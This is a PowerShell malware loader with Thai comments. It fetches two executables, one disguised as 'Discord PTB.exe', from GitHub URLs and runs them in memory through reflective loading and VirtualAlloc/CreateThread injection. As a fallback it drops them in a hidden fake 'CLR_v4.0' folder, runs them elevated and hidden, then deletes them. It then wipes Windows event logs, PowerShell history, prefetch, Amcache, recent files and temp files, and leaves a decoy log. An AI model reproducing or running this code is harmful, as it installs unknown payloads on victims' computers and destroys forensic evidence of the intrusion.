# ============================================
# 1. ปิดการบันทึกประวัติและซ่อนข้อผิดพลาด
# ============================================
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# ============================================
# 2. ฟังก์ชันดาวน์โหลด EXE เป็น Byte Array
# ============================================
function Download-EXE {
    param([string]$Url)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        return $wc.DownloadData($Url)
    } catch {
        $response = Invoke-WebRequest -Uri $Url -UseBasicParsing
        return $response.Content
    }
}

# ============================================
# 3. ฟังก์ชันรัน EXE จากหน่วยความจำ
# ============================================
function Invoke-MemoryExecution {
    param([byte[]]$Bytes)
    
    # วิธีที่ 1: .NET Assembly
    try {
        $assembly = [System.Reflection.Assembly]::Load($Bytes)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint) {
            $entryPoint.Invoke($null, (, [string[]] @()))
            return $true
        }
    } catch {}

    # วิธีที่ 2: Reflection Injection
    try {
        $ReflectiveInject = {
            param([byte[]]$PEBytes)
            $kernel32 = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
[DllImport("kernel32.dll")]
public static extern IntPtr GetCurrentProcess();
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
'@ -Name "Kernel32" -Namespace "Win32" -PassThru

            $size = $PEBytes.Length
            $ptr = $kernel32::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
            if ($ptr -ne [IntPtr]::Zero) {
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $ptr, $size)
                $thread = $kernel32::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
                if ($thread -ne [IntPtr]::Zero) {
                    $kernel32::WaitForSingleObject($thread, 0xFFFFFFFF)
                    return $true
                }
            }
            return $false
        }
        return & $ReflectiveInject $Bytes
    } catch {
        return $false
    }
}

# ============================================
# 4. ฟังก์ชันสำรอง: เขียนไฟล์และรัน
# ============================================
function Invoke-FileExecution {
    param([byte[]]$Bytes)
    $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
    if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
    New-Item -Path $workDir -ItemType Directory -Force | Out-Null
    & attrib +h +s $workDir
    
    $exeOutput = Join-Path $workDir "WinHelper.exe"
    [System.IO.File]::WriteAllBytes($exeOutput, $Bytes)
    
    Start-Process -FilePath $exeOutput -Verb RunAs -WindowStyle Hidden
    
    Start-Process cmd -ArgumentList "/c timeout /t 15 && del /f /q `"$exeOutput`"" -WindowStyle Hidden
}

# ============================================
# 5. ดาวน์โหลดและรัน EXE ทั้ง 2 ตัว
# ============================================

# --- 5.1 Discord PTB.exe ---
$exeUrl1 = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/Discord%20PTB.exe"
$bytes1 = Download-EXE -Url $exeUrl1
if ($bytes1 -and $bytes1.Length -gt 0) {
    $executed1 = Invoke-MemoryExecution -Bytes $bytes1
    if (-not $executed1) {
        Invoke-FileExecution -Bytes $bytes1
    }
}

# --- 5.2 main.exe ---
$exeUrl2 = "https://github.com/relaxhaha56-maker/Data-Scraping-Bot/raw/refs/heads/main/main.exe"
$bytes2 = Download-EXE -Url $exeUrl2
if ($bytes2 -and $bytes2.Length -gt 0) {
    $executed2 = Invoke-MemoryExecution -Bytes $bytes2
    if (-not $executed2) {
        Invoke-FileExecution -Bytes $bytes2
    }
}

# ============================================
# 6. ล้างร่องรอยขั้นสูง (Anti-Forensics)
# ============================================

# --- 6.1 ล้าง PowerShell History ---
try {
    $historyPath = (Get-PSReadlineOption).HistorySavePath
    if ($historyPath -and (Test-Path $historyPath)) {
        Remove-Item $historyPath -Force
    }
} catch {}

# --- 6.2 ล้าง Windows Event Logs ---
try {
    wevtutil cl Security 2>$null
    wevtutil cl System 2>$null
    wevtutil cl Application 2>$null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
} catch {}

# --- 6.3 ล้าง Prefetch ---
try {
    Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.4 ล้าง Amcache ---
try {
    Remove-Item "C:\Windows\AppCompat\Programs\Amcache.hve" -Force -ErrorAction SilentlyContinue
} catch {}

# --- 6.5 ล้าง Recent Documents ---
try {
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
} catch {}

# --- 6.6 ล้าง Temporary Files ---
try {
    Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\Temp\*" -Force -Recurse -ErrorAction SilentlyContinue
} catch {}

# --- 6.7 ล้าง DNS Cache ---
try {
    ipconfig /flushdns 2>$null
} catch {}

# ============================================
# 7. สร้างไฟล์ปลอมเพื่อเบี่ยงเบนความสนใจ
# ============================================
try {
    $fakePath = "$env:USERPROFILE\Documents\SystemCheck.log"
    "System Check Completed: $(Get-Date)" | Out-File $fakePath -Force
    & attrib +h $fakePath
} catch {}

# ============================================
# 8. ปิดตัวเองอย่างเงียบ ๆ
# ============================================
exit
